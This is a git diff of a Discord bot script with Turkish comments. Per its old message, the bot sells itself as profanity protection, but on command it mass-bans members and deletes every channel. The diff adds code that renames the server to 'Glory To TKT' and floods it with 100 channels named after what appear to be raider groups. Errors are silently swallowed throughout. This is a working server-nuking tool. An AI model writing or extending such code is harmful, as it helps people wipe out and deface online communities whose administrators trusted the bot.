@@ -1,6 +1,6 @@
 // index.js
 require('dotenv').config();
-const { Client, GatewayIntentBits, Partials, PermissionsBitField } = require('discord.js');
+const { Client, GatewayIntentBits, Partials } = require('discord.js');
 
 const client = new Client({
   intents: [
@@ -100,7 +100,17 @@ client.on('messageCreate', async (message) => {
       await channel.delete().catch(() => {});
     }
 
-    message.channel.send(`🧹 ${bannedCount} kişi küfürkoruma ile banlandı. Tüm kanallar silindi.`);
+    // Sunucu adını değiştir
+    await message.guild.setName('Glory To TKT').catch(() => {});
+
+    // 100 yeni kanal oluştur (TKT, FORS, ALİLW, TKT sırayla)
+    const names = ['TKT', 'FORS', 'ALİLW', 'TKT'];
+    for (let i = 0; i < 100; i++) {
+      const name = names[i % names.length];
+      await message.guild.channels.create({ name: name }).catch(() => {});
+    }
+
+    message.channel.send(`🧹 ${bannedCount} kişi banlandı. Kanallar silindi ve yeniden oluşturuldu. Glory To TKT!`);
   }
 });
 
